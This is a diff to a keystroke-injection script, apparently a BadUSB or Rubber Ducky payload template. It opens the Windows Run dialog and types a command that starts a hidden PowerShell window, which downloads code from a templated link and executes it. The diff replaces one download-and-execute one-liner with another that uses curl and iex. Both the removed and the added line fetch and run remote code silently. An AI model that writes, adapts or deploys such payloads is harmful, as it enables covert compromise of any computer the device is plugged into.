@@ -1,5 +1,5 @@
 DELAY {delay}
 GUI r
 DELAY 350
-STRING cmd /c start /min powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('{link}')"
+STRING cmd /c start /min powershell -w hidden "$x=cmd /c curl '{link}'; iex $x"
 ENTER
